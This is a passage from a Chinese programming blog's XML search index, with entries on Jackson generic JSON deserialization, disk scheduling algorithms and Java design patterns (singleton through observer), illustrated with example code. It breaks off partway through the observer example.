&quot;[&#123;\&quot;userName\&quot;:\&quot;mrbird\&quot;,\&quot;age\&quot;:26&#125;,&#123;\&quot;userName\&quot;:\&quot;scott\&quot;,\&quot;age\&quot;:27&#125;]&quot;; List&lt;User&gt; list = mapper.readValue(jsonStr, List.class); String msg = &quot;&quot;; for (User user : list) &#123; msg += user.getUserName(); &#125; return msg;&#125; 访问customize，控制台抛出异常： 1java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to com.example.pojo.User 这是因为在运行时刻，泛型己经被擦除了（不同于方法参数定义的泛型，不会被擦除）。为了提供泛型信息，Jackson提供了JavaType ，用来指明集合类型，将上述方法改为： 123456789101112131415@AutowiredObjectMapper mapper;@RequestMapping(&quot;customize&quot;)@ResponseBodypublic String customize() throws JsonParseException, JsonMappingException, IOException &#123; String jsonStr = &quot;[&#123;\&quot;userName\&quot;:\&quot;mrbird\&quot;,\&quot;age\&quot;:26&#125;,&#123;\&quot;userName\&quot;:\&quot;scott\&quot;,\&quot;age\&quot;:27&#125;]&quot;; JavaType type = mapper.getTypeFactory().constructParametricType(List.class, User.class); List&lt;User&gt; list = mapper.readValue(jsonStr, type); String msg = &quot;&quot;; for (User user : list) &#123; msg += user.getUserName(); &#125; return msg;&#125; 访问customize，页面输出：mrbirdscott。]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>JSON</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设备管理]]></title>
    <url>%2F2019%2F01%2F07%2F%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[磁盘结构 盘面（Platter）：一个磁盘有多个盘面； 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道； 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小； 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）； 制动手臂（Actuator arm）：用于在磁道之间移动磁头； 主轴（Spindle）：使整个盘面转动。 磁盘调度算法读写一个磁盘块的时间的影响因素有： 旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上） 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上） 实际的数据传输时间 其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。 1. 先来先服务 FCFS, First Come First Served 按照磁盘请求的顺序进行调度。 优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。 2. 最短寻道时间优先 SSTF, Shortest Seek Time First 优先调度与当前磁头所在磁道距离最近的磁道。 虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两端的磁道请求更容易出现饥饿现象。 3. 电梯算法 SCAN 电梯总是保持一个方向运行，直到该方向没有请求为止，然后改变运行方向。 电梯算法（扫描算法）和电梯的运行过程类似，总是按一个方向来进行磁盘调度，直到该方向上没有未完成的磁盘请求，然后改变方向。 因为考虑了移动方向，因此所有的磁盘请求都会被满足，解决了 SSTF 的饥饿问题。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
        <tag>设备管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式]]></title>
    <url>%2F2019%2F01%2F07%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[一、概述设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。 拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。 源码以及 UML 图 二、创建型1. 单例（Singleton）Intent确保一个类只有一个实例，并提供该实例的全局访问点。 Class Diagram使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。 私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。 ImplementationⅠ 懒汉式-线程不安全以下实现中，私有静态变量 uniqueInstance 被延迟实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 uniqueInstance，从而节约资源。 这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 if (uniqueInstance == null) ，并且此时 uniqueInstance 为 null，那么会有多个线程执行 uniqueInstance = new Singleton(); 语句，这将导致实例化多次 uniqueInstance。 1234567891011121314public class Singleton &#123; private static Singleton uniqueInstance; private Singleton() &#123; &#125; public static Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance; &#125;&#125; Ⅱ 饿汉式-线程安全线程不安全问题主要是由于 uniqueInstance 被实例化多次，采取直接实例化 uniqueInstance 的方式就不会产生线程不安全问题。 但是直接实例化的方式也丢失了延迟实例化带来的节约资源的好处。 1private static Singleton uniqueInstance = new Singleton(); Ⅲ 懒汉式-线程安全只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了实例化多次 uniqueInstance。 但是当一个线程进入该方法之后，其它试图进入该方法的线程都必须等待，即使 uniqueInstance 已经被实例化了。这会让线程阻塞时间过长，因此该方法有性能问题，不推荐使用。 123456public static synchronized Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance;&#125; Ⅳ 双重校验锁-线程安全uniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。 双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。 123456789101112131415161718public class Singleton &#123; private volatile static Singleton uniqueInstance; private Singleton() &#123; &#125; public static Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; synchronized (Singleton.class) &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; &#125; &#125; return uniqueInstance; &#125;&#125; 考虑下面的实现，也就是只使用了一个 if 语句。在 uniqueInstance == null 的情况下，如果两个线程都执行了 if 语句，那么两个线程都会进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 uniqueInstance = new Singleton(); 这条语句，只是先后的问题，那么就会进行两次实例化。因此必须使用双重校验锁，也就是需要使用两个 if 语句。 12345if (uniqueInstance == null) &#123; synchronized (Singleton.class) &#123; uniqueInstance = new Singleton(); &#125;&#125; uniqueInstance 采用 volatile 关键字修饰也是很有必要的， uniqueInstance = new Singleton(); 这段代码其实是分为三步执行： 为 uniqueInstance 分配内存空间 初始化 uniqueInstance 将 uniqueInstance 指向分配的内存地址 但是由于 JVM 具有指令重排的特性，执行顺序有可能变成 1&gt;3&gt;2。指令重排在单线程环境下不会出现问题，但是在多线程环境下会导致一个线程获得还没有初始化的实例。例如，线程 T1 执行了 1 和 3，此时 T2 调用 getUniqueInstance() 后发现 uniqueInstance 不为空，因此返回 uniqueInstance，但此时 uniqueInstance 还未被初始化。 使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。 Ⅴ 静态内部类实现当 Singleton 类加载时，静态内部类 SingletonHolder 没有被加载进内存。只有当调用 getUniqueInstance() 方法从而触发 SingletonHolder.INSTANCE 时 SingletonHolder 才会被加载，此时初始化 INSTANCE 实例，并且 JVM 能确保 INSTANCE 只被实例化一次。 这种方式不仅具有延迟初始化的好处，而且由 JVM 提供了对线程安全的支持。 12345678910111213public class Singleton &#123; private Singleton() &#123; &#125; private static class SingletonHolder &#123; private static final Singleton INSTANCE = new Singleton(); &#125; public static Singleton getUniqueInstance() &#123; return SingletonHolder.INSTANCE; &#125;&#125; Ⅵ 枚举实现123456789101112131415161718192021222324252627282930313233343536373839public enum Singleton &#123; INSTANCE; private String objName; public String getObjName() &#123; return objName; &#125; public void setObjName(String objName) &#123; this.objName = objName; &#125; public static void main(String[] args) &#123; // 单例测试 Singleton firstSingleton = Singleton.INSTANCE; firstSingleton.setObjName("firstName"); System.out.println(firstSingleton.getObjName()); Singleton secondSingleton = Singleton.INSTANCE; secondSingleton.setObjName("secondName"); System.out.println(firstSingleton.getObjName()); System.out.println(secondSingleton.getObjName()); // 反射获取实例测试 try &#123; Singleton[] enumConstants = Singleton.class.getEnumConstants(); for (Singleton enumConstant : enumConstants) &#123; System.out.println(enumConstant.getObjName()); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 1234firstNamesecondNamesecondNamesecondName 该实现在多次序列化再进行反序列化之后，不会得到多个实例。而其它实现需要使用 transient 修饰所有字段，并且实现序列化和反序列化的方法。 该实现可以防止反射攻击。在其它实现中，通过 setAccessible() 方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象，如果要防止这种攻击，需要在构造函数中添加防止多次实例化的代码。该实现是由 JVM 保证只会实例化一次，因此不会出现上述的反射攻击。 Examples Logger Classes Configuration Classes Accesing resources in shared mode Factories implemented as Singletons JDK java.lang.Runtime#getRuntime() java.awt.Desktop#getDesktop() java.lang.System#getSecurityManager() 2. 简单工厂（Simple Factory）Intent在创建一个对象时不向客户暴露内部细节，并提供一个创建对象的通用接口。 Class Diagram简单工厂把实例化的操作单独放到一个类中，这个类就成为简单工厂类，让简单工厂类来决定应该用哪个具体子类来实例化。 这样做能把客户类和具体子类的实现解耦，客户类不再需要知道有哪些子类以及应当实例化哪个子类。客户类往往有多个，如果不使用简单工厂，那么所有的客户类都要知道所有子类的细节。而且一旦子类发生改变，例如增加子类，那么所有的客户类都要进行修改。 Implementation12public interface Product &#123;&#125; 12public class ConcreteProduct implements Product &#123;&#125; 12public class ConcreteProduct1 implements Product &#123;&#125; 12public class ConcreteProduct2 implements Product &#123;&#125; 以下的 Client 类包含了实例化的代码，这是一种错误的实现。如果在客户类中存在这种实例化代码，就需要考虑将代码放到简单工厂中。 123456789101112131415public class Client &#123; public static void main(String[] args) &#123; int type = 1; Product product; if (type == 1) &#123; product = new ConcreteProduct1(); &#125; else if (type == 2) &#123; product = new ConcreteProduct2(); &#125; else &#123; product = new ConcreteProduct(); &#125; // do something with the product &#125;&#125; 以下的 SimpleFactory 是简单工厂实现，它被所有需要进行实例化的客户类调用。 1234567891011public class SimpleFactory &#123; public Product createProduct(int type) &#123; if (type == 1) &#123; return new ConcreteProduct1(); &#125; else if (type == 2) &#123; return new ConcreteProduct2(); &#125; return new ConcreteProduct(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; SimpleFactory simpleFactory = new SimpleFactory(); Product product = simpleFactory.createProduct(1); // do something with the product &#125;&#125; 3. 工厂方法（Factory Method）Intent定义了一个创建对象的接口，但由子类决定要实例化哪个类。工厂方法把实例化操作推迟到子类。 Class Diagram在简单工厂中，创建对象的是另一个类，而在工厂方法中，是由子类来创建对象。 下图中，Factory 有一个 doSomething() 方法，这个方法需要用到一个产品对象，这个产品对象由 factoryMethod() 方法创建。该方法是抽象的，需要由子类去实现。 Implementation1234567public abstract class Factory &#123; abstract public Product factoryMethod(); public void doSomething() &#123; Product product = factoryMethod(); // do something with the product &#125;&#125; 12345public class ConcreteFactory extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct(); &#125;&#125; 12345public class ConcreteFactory1 extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct1(); &#125;&#125; 12345public class ConcreteFactory2 extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct2(); &#125;&#125; JDK java.util.Calendar java.util.ResourceBundle java.text.NumberFormat java.nio.charset.Charset java.net.URLStreamHandlerFactory java.util.EnumSet javax.xml.bind.JAXBContext 4. 抽象工厂（Abstract Factory）Intent提供一个接口，用于创建 相关的对象家族 。 Class Diagram抽象工厂模式创建的是对象家族，也就是很多对象而不是一个对象，并且这些对象是相关的，也就是说必须一起创建出来。而工厂方法模式只是用于创建一个对象，这和抽象工厂模式有很大不同。 抽象工厂模式用到了工厂方法模式来创建单一对象，AbstractFactory 中的 createProductA() 和 createProductB() 方法都是让子类来实现，这两个方法单独来看就是在创建一个对象，这符合工厂方法模式的定义。 至于创建对象的家族这一概念是在 Client 体现，Client 要通过 AbstractFactory 同时调用两个方法来创建出两个对象，在这里这两个对象就有很大的相关性，Client 需要同时创建出这两个对象。 从高层次来看，抽象工厂使用了组合，即 Cilent 组合了 AbstractFactory，而工厂方法模式使用了继承。 Implementation12public class AbstractProductA &#123;&#125; 12public class AbstractProductB &#123;&#125; 12public class ProductA1 extends AbstractProductA &#123;&#125; 12public class ProductA2 extends AbstractProductA &#123;&#125; 12public class ProductB1 extends AbstractProductB &#123;&#125; 12public class ProductB2 extends AbstractProductB &#123;&#125; 1234public abstract class AbstractFactory &#123; abstract AbstractProductA createProductA(); abstract AbstractProductB createProductB();&#125; 123456789public class ConcreteFactory1 extends AbstractFactory &#123; AbstractProductA createProductA() &#123; return new ProductA1(); &#125; AbstractProductB createProductB() &#123; return new ProductB1(); &#125;&#125; 123456789public class ConcreteFactory2 extends AbstractFactory &#123; AbstractProductA createProductA() &#123; return new ProductA2(); &#125; AbstractProductB createProductB() &#123; return new ProductB2(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; AbstractFactory abstractFactory = new ConcreteFactory1(); AbstractProductA productA = abstractFactory.createProductA(); AbstractProductB productB = abstractFactory.createProductB(); // do something with productA and productB &#125;&#125; JDK javax.xml.parsers.DocumentBuilderFactory javax.xml.transform.TransformerFactory javax.xml.xpath.XPathFactory 5. 生成器（Builder）Intent封装一个对象的构造过程，并允许按步骤构造。 Class Diagram Implementation以下是一个简易的 StringBuilder 实现，参考了 JDK 1.8 源码。 12345678910111213141516171819202122232425262728293031323334public class AbstractStringBuilder &#123; protected char[] value; protected int count; public AbstractStringBuilder(int capacity) &#123; count = 0; value = new char[capacity]; &#125; public AbstractStringBuilder append(char c) &#123; ensureCapacityInternal(count + 1); value[count++] = c; return this; &#125; private void ensureCapacityInternal(int minimumCapacity) &#123; // overflow-conscious code if (minimumCapacity - value.length &gt; 0) expandCapacity(minimumCapacity); &#125; void expandCapacity(int minimumCapacity) &#123; int newCapacity = value.length * 2 + 2; if (newCapacity - minimumCapacity &lt; 0) newCapacity = minimumCapacity; if (newCapacity &lt; 0) &#123; if (minimumCapacity &lt; 0) // overflow throw new OutOfMemoryError(); newCapacity = Integer.MAX_VALUE; &#125; value = Arrays.copyOf(value, newCapacity); &#125;&#125; 1234567891011public class StringBuilder extends AbstractStringBuilder &#123; public StringBuilder() &#123; super(16); &#125; @Override public String toString() &#123; // Create a copy, don't share the array return new String(value, 0, count); &#125;&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; StringBuilder sb = new StringBuilder(); final int count = 26; for (int i = 0; i &lt; count; i++) &#123; sb.append((char) ('a' + i)); &#125; System.out.println(sb.toString()); &#125;&#125; 1abcdefghijklmnopqrstuvwxyz JDK java.lang.StringBuilder java.nio.ByteBuffer java.lang.StringBuffer java.lang.Appendable Apache Camel builders 6. 原型模式（Prototype）Intent使用原型实例指定要创建对象的类型，通过复制这个原型来创建新对象。 Class Diagram Implementation123public abstract class Prototype &#123; abstract Prototype myClone();&#125; 123456789101112131415161718public class ConcretePrototype extends Prototype &#123; private String filed; public ConcretePrototype(String filed) &#123; this.filed = filed; &#125; @Override Prototype myClone() &#123; return new ConcretePrototype(filed); &#125; @Override public String toString() &#123; return filed; &#125;&#125; 1234567public class Client &#123; public static void main(String[] args) &#123; Prototype prototype = new ConcretePrototype("abc"); Prototype clone = prototype.myClone(); System.out.println(clone.toString()); &#125;&#125; 1abc JDK java.lang.Object#clone() 三、行为型1. 责任链（Chain Of Responsibility）Intent使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链发送该请求，直到有一个对象处理它为止。 Class Diagram Handler：定义处理请求的接口，并且实现后继链（successor） Implementation123456789101112public abstract class Handler &#123; protected Handler successor; public Handler(Handler successor) &#123; this.successor = successor; &#125; protected abstract void handleRequest(Request request);&#125; 123456789101112131415161718public class ConcreteHandler1 extends Handler &#123; public ConcreteHandler1(Handler successor) &#123; super(successor); &#125; @Override protected void handleRequest(Request request) &#123; if (request.getType() == RequestType.TYPE1) &#123; System.out.println(request.getName() + " is handle by ConcreteHandler1"); return; &#125; if (successor != null) &#123; successor.handleRequest(request); &#125; &#125;&#125; 123456789101112131415161718public class ConcreteHandler2 extends Handler &#123; public ConcreteHandler2(Handler successor) &#123; super(successor); &#125; @Override protected void handleRequest(Request request) &#123; if (request.getType() == RequestType.TYPE2) &#123; System.out.println(request.getName() + " is handle by ConcreteHandler2"); return; &#125; if (successor != null) &#123; successor.handleRequest(request); &#125; &#125;&#125; 123456789101112131415161718192021public class Request &#123; private RequestType type; private String name; public Request(RequestType type, String name) &#123; this.type = type; this.name = name; &#125; public RequestType getType() &#123; return type; &#125; public String getName() &#123; return name; &#125;&#125; 123public enum RequestType &#123; TYPE1, TYPE2&#125; 1234567891011121314public class Client &#123; public static void main(String[] args) &#123; Handler handler1 = new ConcreteHandler1(null); Handler handler2 = new ConcreteHandler2(handler1); Request request1 = new Request(RequestType.TYPE1, "request1"); handler2.handleRequest(request1); Request request2 = new Request(RequestType.TYPE2, "request2"); handler2.handleRequest(request2); &#125;&#125; 12request1 is handle by ConcreteHandler1request2 is handle by ConcreteHandler2 JDK java.util.logging.Logger#log() Apache Commons Chain javax.servlet.Filter#doFilter() 2. 命令（Command）Intent将命令封装成对象中，具有以下作用： 使用命令来参数化其它对象 将命令放入队列中进行排队 将命令的操作记录到日志中 支持可撤销的操作 Class Diagram Command：命令 Receiver：命令接收者，也就是命令真正的执行者 Invoker：通过它来调用命令 Client：可以设置命令与命令的接收者 Implementation设计一个遥控器，可以控制电灯开关。 123public interface Command &#123; void execute();&#125; 123456789101112public class LightOnCommand implements Command &#123; Light light; public LightOnCommand(Light light) &#123; this.light = light; &#125; @Override public void execute() &#123; light.on(); &#125;&#125; 123456789101112public class LightOffCommand implements Command &#123; Light light; public LightOffCommand(Light light) &#123; this.light = light; &#125; @Override public void execute() &#123; light.off(); &#125;&#125; 12345678910public class Light &#123; public void on() &#123; System.out.println("Light is on!"); &#125; public void off() &#123; System.out.println("Light is off!"); &#125;&#125; 1234567891011121314151617181920212223242526272829/** * 遥控器 */public class Invoker &#123; private Command[] onCommands; private Command[] offCommands; private final int slotNum = 7; public Invoker() &#123; this.onCommands = new Command[slotNum]; this.offCommands = new Command[slotNum]; &#125; public void setOnCommand(Command command, int slot) &#123; onCommands[slot] = command; &#125; public void setOffCommand(Command command, int slot) &#123; offCommands[slot] = command; &#125; public void onButtonWasPushed(int slot) &#123; onCommands[slot].execute(); &#125; public void offButtonWasPushed(int slot) &#123; offCommands[slot].execute(); &#125;&#125; 123456789101112public class Client &#123; public static void main(String[] args) &#123; Invoker invoker = new Invoker(); Light light = new Light(); Command lightOnCommand = new LightOnCommand(light); Command lightOffCommand = new LightOffCommand(light); invoker.setOnCommand(lightOnCommand, 0); invoker.setOffCommand(lightOffCommand, 0); invoker.onButtonWasPushed(0); invoker.offButtonWasPushed(0); &#125;&#125; JDK java.lang.Runnable Netflix Hystrix javax.swing.Action 3. 解释器（Interpreter）Intent为语言创建解释器，通常由语言的语法和语法分析来定义。 Class Diagram TerminalExpression：终结符表达式，每个终结符都需要一个 TerminalExpression。 Context：上下文，包含解释器之外的一些全局信息。 Implementation以下是一个规则检验器实现，具有 and 和 or 规则，通过规则可以构建一颗解析树，用来检验一个文本是否满足解析树定义的规则。 例如一颗解析树为 D And (A Or (B C))，文本 “D A” 满足该解析树定义的规则。 这里的 Context 指的是 String。 123public abstract class Expression &#123; public abstract boolean interpret(String str);&#125; 12345678910111213141516171819public class TerminalExpression extends Expression &#123; private String literal = null; public TerminalExpression(String str) &#123; literal = str; &#125; public boolean interpret(String str) &#123; StringTokenizer st = new StringTokenizer(str); while (st.hasMoreTokens()) &#123; String test = st.nextToken(); if (test.equals(literal)) &#123; return true; &#125; &#125; return false; &#125;&#125; 1234567891011121314public class AndExpression extends Expression &#123; private Expression expression1 = null; private Expression expression2 = null; public AndExpression(Expression expression1, Expression expression2) &#123; this.expression1 = expression1; this.expression2 = expression2; &#125; public boolean interpret(String str) &#123; return expression1.interpret(str) &amp;&amp; expression2.interpret(str); &#125;&#125; 12345678910111213public class OrExpression extends Expression &#123; private Expression expression1 = null; private Expression expression2 = null; public OrExpression(Expression expression1, Expression expression2) &#123; this.expression1 = expression1; this.expression2 = expression2; &#125; public boolean interpret(String str) &#123; return expression1.interpret(str) || expression2.interpret(str); &#125;&#125; 123456789101112131415161718192021222324252627public class Client &#123; /** * 构建解析树 */ public static Expression buildInterpreterTree() &#123; // Literal Expression terminal1 = new TerminalExpression("A"); Expression terminal2 = new TerminalExpression("B"); Expression terminal3 = new TerminalExpression("C"); Expression terminal4 = new TerminalExpression("D"); // B C Expression alternation1 = new OrExpression(terminal2, terminal3); // A Or (B C) Expression alternation2 = new OrExpression(terminal1, alternation1); // D And (A Or (B C)) return new AndExpression(terminal4, alternation2); &#125; public static void main(String[] args) &#123; Expression define = buildInterpreterTree(); String context1 = "D A"; String context2 = "A B"; System.out.println(define.interpret(context1)); System.out.println(define.interpret(context2)); &#125;&#125; 12truefalse JDK java.util.Pattern java.text.Normalizer All subclasses of java.text.Format javax.el.ELResolver 4. 迭代器（Iterator）Intent提供一种顺序访问聚合对象元素的方法，并且不暴露聚合对象的内部表示。 Class Diagram Aggregate 是聚合类，其中 createIterator() 方法可以产生一个 Iterator； Iterator 主要定义了 hasNext() 和 next() 方法。 Client 组合了 Aggregate，为了迭代遍历 Aggregate，也需要组合 Iterator。 Implementation123public interface Aggregate &#123; Iterator createIterator();&#125; 12345678910111213141516public class ConcreteAggregate implements Aggregate &#123; private Integer[] items; public ConcreteAggregate() &#123; items = new Integer[10]; for (int i = 0; i &lt; items.length; i++) &#123; items[i] = i; &#125; &#125; @Override public Iterator createIterator() &#123; return new ConcreteIterator&lt;Integer&gt;(items); &#125;&#125; 123456public interface Iterator&lt;Item&gt; &#123; Item next(); boolean hasNext();&#125; 12345678910111213141516171819public class ConcreteIterator&lt;Item&gt; implements Iterator &#123; private Item[] items; private int position = 0; public ConcreteIterator(Item[] items) &#123; this.items = items; &#125; @Override public Object next() &#123; return items[position++]; &#125; @Override public boolean hasNext() &#123; return position &lt; items.length; &#125;&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; Aggregate aggregate = new ConcreteAggregate(); Iterator&lt;Integer&gt; iterator = aggregate.createIterator(); while (iterator.hasNext()) &#123; System.out.println(iterator.next()); &#125; &#125;&#125; JDK java.util.Iterator java.util.Enumeration 5. 中介者（Mediator）Intent集中相关对象之间复杂的沟通和控制方式。 Class Diagram Mediator：中介者，定义一个接口用于与各同事（Colleague）对象通信。 Colleague：同事，相关对象 ImplementationAlarm（闹钟）、CoffeePot（咖啡壶）、Calendar（日历）、Sprinkler（喷头）是一组相关的对象，在某个对象的事件产生时需要去操作其它对象，形成了下面这种依赖结构： 使用中介者模式可以将复杂的依赖结构变成星形结构： 123public abstract class Colleague &#123; public abstract void onEvent(Mediator mediator);&#125; 1234567891011public class Alarm extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("alarm"); &#125; public void doAlarm() &#123; System.out.println("doAlarm()"); &#125;&#125; 12345678910public class CoffeePot extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("coffeePot"); &#125; public void doCoffeePot() &#123; System.out.println("doCoffeePot()"); &#125;&#125; 12345678910public class Calender extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("calender"); &#125; public void doCalender() &#123; System.out.println("doCalender()"); &#125;&#125; 12345678910public class Sprinkler extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("sprinkler"); &#125; public void doSprinkler() &#123; System.out.println("doSprinkler()"); &#125;&#125; 123public abstract class Mediator &#123; public abstract void doEvent(String eventType);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class ConcreteMediator extends Mediator &#123; private Alarm alarm; private CoffeePot coffeePot; private Calender calender; private Sprinkler sprinkler; public ConcreteMediator(Alarm alarm, CoffeePot coffeePot, Calender calender, Sprinkler sprinkler) &#123; this.alarm = alarm; this.coffeePot = coffeePot; this.calender = calender; this.sprinkler = sprinkler; &#125; @Override public void doEvent(String eventType) &#123; switch (eventType) &#123; case "alarm": doAlarmEvent(); break; case "coffeePot": doCoffeePotEvent(); break; case "calender": doCalenderEvent(); break; default: doSprinklerEvent(); &#125; &#125; public void doAlarmEvent() &#123; alarm.doAlarm(); coffeePot.doCoffeePot(); calender.doCalender(); sprinkler.doSprinkler(); &#125; public void doCoffeePotEvent() &#123; // ... &#125; public void doCalenderEvent() &#123; // ... &#125; public void doSprinklerEvent() &#123; // ... &#125;&#125; 1234567891011public class Client &#123; public static void main(String[] args) &#123; Alarm alarm = new Alarm(); CoffeePot coffeePot = new CoffeePot(); Calender calender = new Calender(); Sprinkler sprinkler = new Sprinkler(); Mediator mediator = new ConcreteMediator(alarm, coffeePot, calender, sprinkler); // 闹钟事件到达，调用中介者就可以操作相关对象 alarm.onEvent(mediator); &#125;&#125; 1234doAlarm()doCoffeePot()doCalender()doSprinkler() JDK All scheduleXXX() methods of java.util.Timer java.util.concurrent.Executor#execute() submit() and invokeXXX() methods of java.util.concurrent.ExecutorService scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService java.lang.reflect.Method#invoke() 6. 备忘录（Memento）Intent在不违反封装的情况下获得对象的内部状态，从而在需要时可以将对象恢复到最初状态。 Class Diagram Originator：原始对象 Caretaker：负责保存好备忘录 Menento：备忘录，存储原始对象的的状态。备忘录实际上有两个接口，一个是提供给 Caretaker 的窄接口：它只能将备忘录传递给其它对象；一个是提供给 Originator 的宽接口，允许它访问到先前状态所需的所有数据。理想情况是只允许 Originator 访问本备忘录的内部状态。 Implementation以下实现了一个简单计算器程序，可以输入两个值，然后计算这两个值的和。备忘录模式允许将这两个值存储起来，然后在某个时刻用存储的状态进行恢复。 实现参考：Memento Pattern - Calculator Example - Java Sourcecode 1234567891011121314151617/** * Originator Interface */public interface Calculator &#123; // Create Memento PreviousCalculationToCareTaker backupLastCalculation(); // setMemento void restorePreviousCalculation(PreviousCalculationToCareTaker memento); int getCalculationResult(); void setFirstNumber(int firstNumber); void setSecondNumber(int secondNumber);&#125; 123456789101112131415161718192021222324252627282930313233343536/** * Originator Implementation */public class CalculatorImp implements Calculator &#123; private int firstNumber; private int secondNumber; @Override public PreviousCalculationToCareTaker backupLastCalculation() &#123; // create a memento object used for restoring two numbers return new PreviousCalculationImp(firstNumber, secondNumber); &#125; @Override public void restorePreviousCalculation(PreviousCalculationToCareTaker memento) &#123; this.firstNumber = ((PreviousCalculationToOriginator) memento).getFirstNumber(); this.secondNumber = ((PreviousCalculationToOriginator) memento).getSecondNumber(); &#125; @Override public int getCalculationResult() &#123; // result is adding two numbers return firstNumber + secondNumber; &#125; @Override public void setFirstNumber(int firstNumber) &#123; this.firstNumber = firstNumber; &#125; @Override public void setSecondNumber(int secondNumber) &#123; this.secondNumber = secondNumber; &#125;&#125; 123456789/** * Memento Interface to Originator * * This interface allows the originator to restore its state */public interface PreviousCalculationToOriginator &#123; int getFirstNumber(); int getSecondNumber();&#125; 123456/** * Memento interface to CalculatorOperator (Caretaker) */public interface PreviousCalculationToCareTaker &#123; // no operations permitted for the caretaker&#125; 1234567891011121314151617181920212223242526/** * Memento Object Implementation * &lt;p&gt; * Note that this object implements both interfaces to Originator and CareTaker */public class PreviousCalculationImp implements PreviousCalculationToCareTaker, PreviousCalculationToOriginator &#123; private int firstNumber; private int secondNumber; public PreviousCalculationImp(int firstNumber, int secondNumber) &#123; this.firstNumber = firstNumber; this.secondNumber = secondNumber; &#125; @Override public int getFirstNumber() &#123; return firstNumber; &#125; @Override public int getSecondNumber() &#123; return secondNumber; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435/** * CareTaker object */public class Client &#123; public static void main(String[] args) &#123; // program starts Calculator calculator = new CalculatorImp(); // assume user enters two numbers calculator.setFirstNumber(10); calculator.setSecondNumber(100); // find result System.out.println(calculator.getCalculationResult()); // Store result of this calculation in case of error PreviousCalculationToCareTaker memento = calculator.backupLastCalculation(); // user enters a number calculator.setFirstNumber(17); // user enters a wrong second number and calculates result calculator.setSecondNumber(-290); // calculate result System.out.println(calculator.getCalculationResult()); // user hits CTRL + Z to undo last operation and see last result calculator.restorePreviousCalculation(memento); // result restored System.out.println(calculator.getCalculationResult()); &#125;&#125; 123110-273110 JDK java.io.Serializable 7. 观察者（Observer）Intent定义对象之间的一对多依赖，当一个对象状态改变时，它的所有依赖都会收到通知并且自动更新状态。 主题（Subject）是被观察的对象，而其所有依赖者（Observer）称为观察者。 Class Diagram主题（Subject）具有注册和移除观察者、并通知所有观察者的功能，主题是通过维护一张观察者列表来实现这些操作的。 观察者（Observer）的注册功能需要调用主题的 registerObserver() 方法。 Implementation天气数据布告板会在天气信息发生改变时更新其内容，布告板有多个，并且在将来会继续增加。 1234567public interface Subject &#123; void registerObserver(Observer o); void removeObserver(Observer o); void notifyObserver();&#125; 12345678910111213141516171819202122232425262728293031323334353637public class WeatherData implements Subject &#123; private List&lt;Observer&gt; observers; private float temperature; private float humidity; private float pressure; public WeatherData() &#123; observers = new ArrayList&lt;&gt;(); &#125; public void setMeasurements(float temperature, float humidity, float pressure) &#123; this.temperature = temperature; this.humidity = humidity; this.pressure = pressure; notifyObserver(); &#125; @Override public void registerObserver(Observer o) &#123; observers.add(o); &#125; @Override public void removeObserver(Observer o) &#123; int i = observers.indexOf(o); if (i &gt;= 0) &#123; observers.remove(i); &#125; &#125; @Override 